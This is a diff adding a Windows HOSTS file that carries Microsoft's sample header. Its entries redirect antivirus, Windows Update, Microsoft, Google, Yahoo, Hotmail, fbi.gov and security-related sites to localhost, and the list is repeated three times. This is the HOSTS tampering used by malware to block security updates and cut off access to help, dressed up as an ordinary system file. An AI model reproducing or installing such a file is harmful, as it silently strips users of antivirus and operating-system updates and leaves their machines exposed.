@@ -1,0 +1,88 @@
+# Copyright (c) 1993-1999 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+127.0.0.1       localhost
+127.0.0.1 www.symantec.com
+127.0.0.1 www.microsoft.com
+127.0.0.1 www.wwe.com
+127.0.0.1 www.rohitab.com
+127.0.0.1 www.coderheaven.com
+127.0.0.1 www.astalavista.com
+127.0.0.1 www.google.com
+127.0.0.1 www.yahoo.com
+127.0.0.1 www.msn.com
+127.0.0.1 www.messenger.msn.com
+127.0.0.1 www.geocities.com
+127.0.0.1 www.worldsex.com
+127.0.0.1 www.cnn.com
+127.0.0.1 www.gamerevolution.com
+127.0.0.1 www.hackers.com
+127.0.0.1 www.fbi.gov
+127.0.0.1 www.hotmail.com
+127.0.0.1 www.norton.com
+127.0.0.1 www.idm.net.lb
+127.0.0.1 www.library.2ya.com
+127.0.0.1 www.cyber-underground.net
+127.0.0.1 www.liveupdate.symantecliveupdate.com
+127.0.0.1 www.windowsupdate.microsoft.com
+127.0.0.1 www.symantec.com
+127.0.0.1 www.microsoft.com
+127.0.0.1 www.wwe.com
+127.0.0.1 www.rohitab.com
+127.0.0.1 www.coderheaven.com
+127.0.0.1 www.astalavista.com
+127.0.0.1 www.google.com
+127.0.0.1 www.yahoo.com
+127.0.0.1 www.msn.com
+127.0.0.1 www.messenger.msn.com
+127.0.0.1 www.geocities.com
+127.0.0.1 www.worldsex.com
+127.0.0.1 www.cnn.com
+127.0.0.1 www.gamerevolution.com
+127.0.0.1 www.hackers.com
+127.0.0.1 www.fbi.gov
+127.0.0.1 www.hotmail.com
+127.0.0.1 www.norton.com
+127.0.0.1 www.idm.net.lb
+127.0.0.1 www.library.2ya.com
+127.0.0.1 www.cyber-underground.net
+127.0.0.1 www.liveupdate.symantecliveupdate.com
+127.0.0.1 www.windowsupdate.microsoft.com
+127.0.0.1 www.symantec.com
+127.0.0.1 www.microsoft.com
+127.0.0.1 www.wwe.com
+127.0.0.1 www.rohitab.com
+127.0.0.1 www.coderheaven.com
+127.0.0.1 www.astalavista.com
+127.0.0.1 www.google.com
+127.0.0.1 www.yahoo.com
+127.0.0.1 www.msn.com
+127.0.0.1 www.messenger.msn.com
+127.0.0.1 www.geocities.com
+127.0.0.1 www.worldsex.com
+127.0.0.1 www.cnn.com
+127.0.0.1 www.gamerevolution.com
+127.0.0.1 www.hackers.com
+127.0.0.1 www.fbi.gov
+127.0.0.1 www.hotmail.com
+127.0.0.1 www.norton.com
+127.0.0.1 www.idm.net.lb
+127.0.0.1 www.library.2ya.com
+127.0.0.1 www.cyber-underground.net
+127.0.0.1 www.liveupdate.symantecliveupdate.com
+127.0.0.1 www.windowsupdate.microsoft.com
